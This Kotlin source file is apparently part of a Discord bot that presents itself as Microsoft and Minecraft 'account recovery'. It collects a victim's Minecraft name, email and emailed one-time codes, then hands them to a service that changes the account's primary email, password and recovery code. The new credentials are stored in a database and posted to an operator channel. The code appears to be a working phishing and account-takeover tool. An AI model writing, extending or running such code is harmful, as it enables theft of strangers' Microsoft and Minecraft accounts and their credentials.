package event.events

import config.BotPropertiesManager
import database.model.RecoveredAccount
import database.repository.AccountRepository
import dev.kord.common.entity.ButtonStyle
import dev.kord.common.entity.TextInputStyle
import dev.kord.core.Kord
import dev.kord.core.behavior.edit
import dev.kord.core.behavior.interaction.modal
import dev.kord.core.behavior.interaction.respondEphemeral
import dev.kord.core.behavior.interaction.response.edit
import dev.kord.core.behavior.interaction.response.respond
import dev.kord.core.entity.interaction.response.EphemeralMessageInteractionResponse
import dev.kord.core.event.interaction.ButtonInteractionCreateEvent
import dev.kord.core.event.interaction.ModalSubmitInteractionCreateEvent
import dev.kord.core.on
import dev.kord.rest.builder.message.actionRow
import discord.DiscordLogger
import event.model.EventInterface
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.ensureActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import kotlinx.coroutines.withTimeoutOrNull
import microsoft.recovery.RecoveryService
import microsoft.recovery.alias.OtcTimeoutException
import microsoft.recovery.model.RecoveryResult
import org.slf4j.LoggerFactory
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap
import kotlin.time.Duration.Companion.milliseconds

class RecoveryInteractionEvent(
    private val recoveryService: RecoveryService,
    private val discordLogger: DiscordLogger,
    private val accountRepository: AccountRepository,
) : EventInterface {

    private val logger = LoggerFactory.getLogger(RecoveryInteractionEvent::class.java)
    private val recoveryScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private val pendingOtpSessions = ConcurrentHashMap<String, CompletableDeferred<String>>()
    private val pendingAliasOtcSessions = ConcurrentHashMap<String, CompletableDeferred<String>>()

    internal suspend fun prepareRecoveryAccount(email: String): Boolean = withContext(Dispatchers.IO) {
        if (email.isBlank()) return@withContext true
        try {
            val existing = accountRepository.getAccountByOriginalEmail(email)
            if (existing != null && existing.status.equals(RecoveredAccount.STATUS_SUCCESS, ignoreCase = true)) {
                return@withContext false
            }
            if (existing != null) {
                accountRepository.deleteByOriginalEmail(email)
            }
            accountRepository.saveAccount(
                RecoveredAccount(
                    originalEmail = email,
                    status = RecoveredAccount.STATUS_PENDING,
                ),
            )
            true
        } catch (e: Exception) {
            if (e is CancellationException) throw e
            logger.error("Database state preparation failed for {}: {}", email, e.message, e)
            true
        }
    }

    internal suspend fun markRecoverySuccess(email: String, result: RecoveryResult.Success): Unit = withContext(Dispatchers.IO) {
        try {
            accountRepository.saveAccount(
                RecoveredAccount(
                    originalEmail = email,
                    currentPrimaryEmail = result.newPrimaryEmail,
                    password = result.password,
                    recoveryCode = result.finalRecoveryCode,
                    ownsMinecraft = false,
                    status = RecoveredAccount.STATUS_SUCCESS,
                    failReason = null,
                ),
            )
        } catch (e: Exception) {
            if (e is CancellationException) throw e
            logger.error("Failed to mark account SUCCESS for {}: {}", email, e.message, e)
        }
    }

    override fun register(kord: Kord, properties: BotPropertiesManager) {
        kord.on<ButtonInteractionCreateEvent> {
            val componentId = interaction.componentId
            when {
                componentId == "start_recovery_btn" -> {
                    runCatching {
                        interaction.modal("Khôi phục tài khoản", "recovery_step1_modal") {
                            actionRow {
                                textInput(TextInputStyle.Short, "ign_input", "IGN") {
                                    required = true
                                    placeholder = "Nhập tên in-game Minecraft"
                                }
                            }
                            actionRow {
                                textInput(TextInputStyle.Short, "email_input", "Email") {
                                    required = true
                                    placeholder = "Nhập email tài khoản Microsoft"
                                }
                            }
                        }
                    }.onFailure {
                        if (it is CancellationException) {
                            currentCoroutineContext().ensureActive()
                        }
                    }.onFailure { err ->
                        logger.warn("Could not open recovery_step1_modal: {}", err.message)
                    }
                }

                componentId.startsWith("open_otp_modal:") -> {
                    val sessionId = componentId.substringAfter("open_otp_modal:")
                    runCatching {
                        interaction.modal("Nhập mã OTP", "recovery_step2_modal:$sessionId") {
                            actionRow {
                                textInput(TextInputStyle.Short, "otp_input", "Mã OTP") {
                                    required = true
                                    placeholder = "Nhập mã OTP gồm 6 chữ số"
                                }
                            }
                        }
                    }.onFailure {
                        if (it is CancellationException) {
                            currentCoroutineContext().ensureActive()
                        }
                    }.onFailure { err ->
                        logger.warn("Could not open recovery_step2_modal: {}", err.message)
                    }
                }

                componentId.startsWith("open_alias_otc_modal:") -> {
                    val sessionId = componentId.substringAfter("open_alias_otc_modal:")
                    if (!pendingAliasOtcSessions.containsKey(sessionId)) {
                        runCatching {
                            interaction.respondEphemeral {
                                content = "Phiên nhập OTC alias này đã hết hạn hoặc đã được xử lý."
                            }
                        }.onFailure {
                            if (it is CancellationException) {
                                currentCoroutineContext().ensureActive()
                            }
                        }.onFailure { err ->
                            logger.warn("Could not respond to expired alias OTC button: {}", err.message)
                        }
                    } else {
                        runCatching {
                            interaction.modal("Nhập mã OTC Alias", "recovery_alias_otc_modal:$sessionId") {
                                actionRow {
                                    textInput(TextInputStyle.Short, "alias_otc_input", "Mã OTC / Link Verify Alias") {
                                        required = true
                                        placeholder = "Nhập mã OTC hoặc dán link Verify..."
                                    }
                                }
                            }
                        }.onFailure {
                            if (it is CancellationException) {
                                currentCoroutineContext().ensureActive()
                            }
                        }.onFailure { err ->
                            logger.warn("Could not open recovery_alias_otc_modal: {}", err.message)
                        }
                    }
                }
            }
        }

        kord.on<ModalSubmitInteractionCreateEvent> {
            val modalId = interaction.modalId
            when {
                modalId == "recovery_step1_modal" -> {
                    val ign = interaction.textInputs["ign_input"]?.value?.trim().orEmpty()
                    val email = interaction.textInputs["email_input"]?.value?.trim().orEmpty()

                    val response = interaction.deferEphemeralResponse()
                    val sessionId = UUID.randomUUID().toString().take(8)

                    recoveryScope.launch {
                        var initialResponse: EphemeralMessageInteractionResponse? = null
                        try {
                            val canProceed = prepareRecoveryAccount(email)
                            if (!canProceed) {
                                runCatching {
                                    response.respond {
                                        content = "Tài khoản này đã được khôi phục thành công trước đó. Không chạy lại để tránh bị Microsoft block."
                                    }
                                }.onFailure {
                                    if (it is CancellationException) {
                                        ensureActive()
                                    }
                                    logger.warn("Could not respond to already-recovered interaction: {}", it.message)
                                }
                                return@launch
                            }

                            val result = recoveryService.runLifecycle(
                                email = email,
                                otpProvider = {
                                    val otpDeferred = CompletableDeferred<String>()
                                    pendingOtpSessions[sessionId] = otpDeferred
                                    runCatching {
                                        initialResponse = response.respond {
                                            content = "Mã OTP đã được gửi đến proof bảo mật của `$email`.\nNhấn nút bên dưới để nhập mã OTP:"
                                            actionRow {
                                                interactionButton(ButtonStyle.Primary, "open_otp_modal:$sessionId") {
                                                    label = "Nhập mã OTP"
                                                }
                                            }
                                        }
                                    }.onFailure {
                                        if (it is CancellationException) {
                                            currentCoroutineContext().ensureActive()
                                        }
                                    }.onFailure { err ->
                                        logger.error("Failed to respond with OTP button: {}", err.message)
                                    }
                                    try {
                                        withTimeout(120_000L.milliseconds) {
                                            otpDeferred.await()
                                        }
                                    } finally {
                                        pendingOtpSessions.remove(sessionId)
                                    }
                                },
                                stageListener = { stageKey, stageName, isSuccess, detail ->
                                    discordLogger.logStage(
                                        logChannelId = properties.logChannelId,
                                        stageKey = stageKey,
                                        stageName = stageName,
                                        isSuccess = isSuccess,
                                        detail = detail,
                                    )
                                },
                                aliasOtcProvider = { alias ->
                                    val aliasSessionId = UUID.randomUUID().toString().take(8)
                                    val aliasOtcDeferred = CompletableDeferred<String>()
                                    pendingAliasOtcSessions[aliasSessionId] = aliasOtcDeferred
                                    val promptChannelId = if (properties.logChannelId != 0L) {
                                        properties.logChannelId
                                    } else {
                                        properties.notiChannelId
                                    }
                                    val promptMessage = discordLogger.sendAliasOtcPrompt(
                                        channelId = promptChannelId,
                                        alias = alias,
                                        sessionId = aliasSessionId,
                                    )
                                    runCatching {
                                        initialResponse?.edit {
                                            content = "Stage 8: Nhấn nút bên dưới (hoặc trong kênh log) để nhập mã OTC cho alias `$alias`:"
                                            actionRow {
                                                interactionButton(ButtonStyle.Primary, "open_alias_otc_modal:$aliasSessionId") {
                                                    label = "Nhập OTC Alias"
                                                }
                                            }
                                        }
                                    }.onFailure {
                                        if (it is CancellationException) {
                                            currentCoroutineContext().ensureActive()
                                        }
                                    }.onFailure { err ->
                                        logger.warn("Could not update ephemeral message with alias OTC button: {}", err.message)
                                    }
                                    try {
                                        withTimeoutOrNull(300_000L.milliseconds) {
                                            aliasOtcDeferred.await()
                                        } ?: throw OtcTimeoutException("Hết thời gian chờ nhập mã OTC cho alias $alias (5 phút)")
                                    } finally {
                                        pendingAliasOtcSessions.remove(aliasSessionId)
                                        runCatching {
                                            promptMessage?.edit {
                                                components = mutableListOf()
                                            }
                                        }.onFailure {
                                            if (it is CancellationException) {
                                                currentCoroutineContext().ensureActive()
                                            }
                                        }
                                    }
                                },
                            )

                            val finalMsg = when (result) {
                                is RecoveryResult.Success -> {
                                    markRecoverySuccess(email, result)
                                    discordLogger.sendFinalResult(
                                        notiChannelId = properties.notiChannelId,
                                        isSuccess = true,
                                        ign = ign,
                                        originalEmail = email,
                                        newEmail = result.newPrimaryEmail,
                                        password = result.password,
                                        recoveryCode = result.finalRecoveryCode,
                                    )
                                    "✅ Khôi phục tài khoản hoàn tất thành công!"
                                }

                                is RecoveryResult.Failure -> {
                                    discordLogger.sendFinalResult(
                                        notiChannelId = properties.notiChannelId,
                                        isSuccess = false,
                                        ign = ign,
                                        originalEmail = email,
                                        errorReason = "${result.stage}: ${result.message}",
                                    )
                                    "❌ Khôi phục thất bại (${result.stage}): ${result.message}"
                                }
                            }

                            runCatching {
                                val current = initialResponse
                                current?.edit {
                                    content = finalMsg
                                    components = mutableListOf()
                                }
                                    ?: response.respond {
                                        content = finalMsg
                                    }
                            }.onFailure {
                                if (it is CancellationException) {
                                    ensureActive()
                                }
                            }.onFailure { err ->
                                logger.warn("Could not update interaction response: {}", err.message)
                            }
                        } catch (e: Exception) {
                            logger.error("Failed to run recovery lifecycle for {}: {}", email, e.message, e)
                            discordLogger.sendFinalResult(
                                notiChannelId = properties.notiChannelId,
                                isSuccess = false,
                                ign = ign,
                                originalEmail = email,
                                errorReason = e.message ?: "Unexpected error",
                            )
                            runCatching {
                                val current = initialResponse
                                current?.edit {
                                    content = "❌ Có lỗi xảy ra: ${e.message}"
                                    components = mutableListOf()
                                }
                                    ?: response.respond {
                                        content = "❌ Có lỗi xảy ra: ${e.message}"
                                    }
                            }.onFailure {
                                if (it is CancellationException) {
                                    ensureActive()
                                }
                            }.onFailure { err ->
                                logger.warn("Could not update interaction response after exception: {}", err.message)
                            }
                        }
                    }
                }

                modalId.startsWith("recovery_step2_modal:") -> {
                    val sessionId = modalId.substringAfter("recovery_step2_modal:")
                    val otp = interaction.textInputs["otp_input"]?.value?.trim().orEmpty()

                    runCatching {
                        interaction.respondEphemeral {
                            content = "Đã nhận mã OTP. Đang xử lý khôi phục và bảo mật tài khoản..."
                        }
                    }.onFailure {
                        if (it is CancellationException) {
                            currentCoroutineContext().ensureActive()
                        }
                    }.onFailure { err ->
                        logger.warn("Could not respond to step 2 modal interaction: {}", err.message)
                    }

                    pendingOtpSessions[sessionId]?.complete(otp)
                }

                modalId.startsWith("recovery_alias_otc_modal:") -> {
                    val sessionId = modalId.substringAfter("recovery_alias_otc_modal:")
                    val rawAliasOtc = interaction.textInputs["alias_otc_input"]?.value?.trim().orEmpty()

                    runCatching {
                        interaction.respondEphemeral {
                            content = "Đã nhận mã OTC alias. Đang tiếp tục Stage 8..."
                        }
                    }.onFailure {
                        if (it is CancellationException) {
                            currentCoroutineContext().ensureActive()
                        }
                    }.onFailure { err ->
                        logger.warn("Could not respond to alias OTC modal interaction: {}", err.message)
                    }

                    pendingAliasOtcSessions[sessionId]?.complete(rawAliasOtc)
                }
            }
        }
    }
}
